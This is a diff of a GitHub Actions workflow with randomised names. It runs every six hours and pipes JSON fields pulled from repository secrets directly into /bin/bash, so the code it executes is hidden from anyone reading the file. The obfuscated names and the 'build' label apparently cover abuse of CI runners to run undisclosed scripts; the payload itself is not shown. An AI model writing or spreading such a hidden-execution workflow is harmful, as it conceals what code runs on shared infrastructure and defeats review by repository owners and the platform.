@@ -2,26 +2,23 @@ name: yezhongshu2603
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 4/6 * * *'
+    - cron: '38 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yezhongshu2603
         env:
-          yy0: ${{ secrets.yy0 }}
+          hht61: ${{ secrets.hht61 }}
         run: |
-          echo $yy0 | jq -r .cf7 | /bin/bash
-          echo $n7 | jq -r .iuqul23 | /bin/bash
-          echo $zjqsy5193 | jq -r .eende358 | /bin/bash
-          echo $semp9 | jq -r .lkko43931 | /bin/bash
-          echo $hga93 | jq -r .k22 | /bin/bash
-          echo $fgxa4063 | jq -r .ehwyd6712 | /bin/bash
-          echo $gg5 | jq -r .nkc7188 | /bin/bash
-          echo $fmei54 | jq -r .scmuk6 | /bin/bash
-          echo $ievwj979 | jq -r .djmw2469 | /bin/bash
-          echo $uo31 | jq -r .wlguv87271 | /bin/bash
-          echo $pal496 | jq -r .p8 | /bin/bash
+          echo $hht61 | jq -r .gai67 | /bin/bash
+          echo $dv36344 | jq -r .nk90 | /bin/bash
+          echo $vck35752 | jq -r .vwb600 | /bin/bash
+          echo $rngjr1272 | jq -r .qrh778 | /bin/bash
+          echo $zb7319 | jq -r .gjbfv0079 | /bin/bash
+          echo $g3761 | jq -r .zxitn8 | /bin/bash
+          echo $hdap6040 | jq -r .cx332 | /bin/bash
+          echo $h6 | jq -r .t816 | /bin/bash
 
